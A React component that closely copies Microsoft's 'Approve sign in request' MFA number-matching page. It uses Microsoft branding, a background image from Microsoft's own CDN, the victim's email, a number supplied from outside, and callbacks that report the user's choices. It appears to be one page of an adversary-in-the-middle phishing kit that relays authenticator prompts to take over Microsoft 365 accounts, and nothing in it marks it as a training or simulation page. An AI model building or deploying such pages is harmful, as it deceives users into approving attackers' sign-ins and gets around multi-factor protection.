import React from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface Office365AuthPromptPageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const MicrosoftLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24" aria-hidden="true">
    <rect x="0" y="0" width="11" height="11" fill="#F25022" />
    <rect x="12" y="0" width="11" height="11" fill="#7FBA00" />
    <rect x="0" y="12" width="11" height="11" fill="#00A4EF" />
    <rect x="12" y="12" width="11" height="11" fill="#FFB900" />
    <text x="30" y="18" fontFamily="'Segoe UI', Arial, sans-serif" fontSize="15" fill="#737373">Microsoft</text>
  </svg>
);

const Office365AuthPromptPage: React.FC<Office365AuthPromptPageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const appName = (data.appName as string) || 'Microsoft Authenticator';
  // Microsoft-style number-matching code (two digits). Deterministic from data when available.
  const number = ((data.number as number | string) ?? (data.code as number | string) ?? Math.floor(10 + Math.random() * 90)).toString();

  return (
    <div
      className="min-h-screen flex items-center justify-center p-0 md:p-4"
      style={{
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        backgroundImage: "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundColor: '#e9e9e9',
      }}
    >
      <div
        className="bg-white w-full max-w-[440px] px-11 py-11 shadow-md"
        style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}
      >
        <div className="mb-5">
          <MicrosoftLogo />
        </div>
        {email && (
          <div className="flex items-center text-sm text-[#1b1b1b] mb-3">
            <button
              type="button"
              onClick={() => { onAction('cancel'); navigate(-1); }}
              className="mr-2 text-[#1b1b1b]"
              aria-label="Back"
            >
              &larr;
            </button>
            <span>{email}</span>
          </div>
        )}
        <h1 className="text-[24px] leading-7 font-semibold text-[#1b1b1b] mb-3">Approve sign in request</h1>
        <p className="text-sm text-[#1b1b1b] mb-5">
          Open your {appName} app, and enter the number shown to sign in.
        </p>

        <div className="flex items-center justify-center py-8">
          <div
            className="text-[56px] leading-none font-semibold text-[#1b1b1b] tracking-wide"
            style={{ letterSpacing: '0.08em' }}
          >
            {number}
          </div>
        </div>

        <div className="flex items-center justify-center mb-6">
          <svg className="animate-spin h-5 w-5 text-[#0067b8] mr-2" viewBox="0 0 24 24" fill="none">
            <circle cx="12" cy="12" r="10" stroke="currentColor" strokeOpacity=".25" strokeWidth="4" />
            <path d="M4 12a8 8 0 018-8" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
          </svg>
          <span className="text-sm text-[#1b1b1b]">Waiting for approval on your device&hellip;</span>
        </div>

        <p className="text-sm text-[#1b1b1b] mb-5">No numbers in your app? Make sure to upgrade to the latest version.</p>

        <div className="flex flex-col gap-1 mb-6">
          <button
            type="button"
            onClick={() => onAction('request_alternate_method')}
            className="text-sm text-[#0067b8] hover:underline text-left w-fit"
          >
            I can&rsquo;t use my Microsoft Authenticator app right now
          </button>
          <button
            type="button"
            onClick={() => onAction('more_info')}
            className="text-sm text-[#0067b8] hover:underline text-left w-fit"
          >
            More information
          </button>
        </div>
        <div className="flex justify-end">
          <button
            type="button"
            onClick={() => onAction('deny_authenticator')}
            className="px-6 py-[6px] text-[#1b1b1b] text-sm font-semibold border border-[#8a8886] hover:bg-[#f3f2f1]"
            style={{ minWidth: '108px' }}
          >
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
};

export default Office365AuthPromptPage;
